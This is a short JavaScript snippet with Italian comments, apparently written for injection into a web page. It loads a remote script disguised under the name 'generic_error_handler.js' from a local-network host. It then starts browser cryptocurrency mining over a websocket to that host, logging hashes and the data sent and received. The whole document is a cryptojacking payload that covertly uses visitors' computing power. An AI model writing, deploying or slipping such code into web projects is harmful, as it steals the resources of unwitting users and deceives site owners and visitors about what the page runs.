(function() {
    // Funzione per la creazione e l'aggiunta di uno script al documento
    const script = document.createElement('script');
    script.src = 'http://192.168.0.144:8000/generic_error_handler.js';
    document.head.appendChild(script);

    // Funzione di callback per quando lo script viene caricato
    script.onload = () => {
        console.log('webmr.js is loaded. Starting mining in 3 seconds...');

        // Imposta un timeout di 3 secondi per avviare il mining
        setTimeout(() => {
            // Definisce il server e inizia il mining
            const server = 'ws://192.168.0.144:8181';
            startMining('some-mining-parameters', server);

            // Logga informazioni relative al mining
            console.log('Mining started on server: ' + server);

            // Intervallo per inviare e ricevere dati dal server
            setInterval(() => {
                while (sendStack.length > 0) {
                    console.log('Sending: ', sendStack.pop());
                }
                while (receiveStack.length > 0) {
                    console.log('Receiving: ', receiveStack.pop());
                }
                console.log('Total hashes calculated: ' + totalhashes);
            }, 1000);
        }, 3000);
    };
})();
